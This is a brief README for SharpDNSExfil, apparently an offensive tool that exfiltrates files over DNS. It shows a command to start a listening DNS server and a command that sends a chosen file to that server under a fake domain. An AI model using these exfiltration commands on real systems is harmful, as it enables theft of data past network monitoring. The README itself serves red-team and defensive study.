# SharpDNSExfil

## How to Use

1. Setup a dnserver.py script
```
python3 dnserver.py --udp --port 53 --host 127.0.0.1
```

2. Exfiltrate data 
```
SharpDnsExfil.exe -f C:\path\to\file -s 127.0.0.1 -d fakedomain.local
```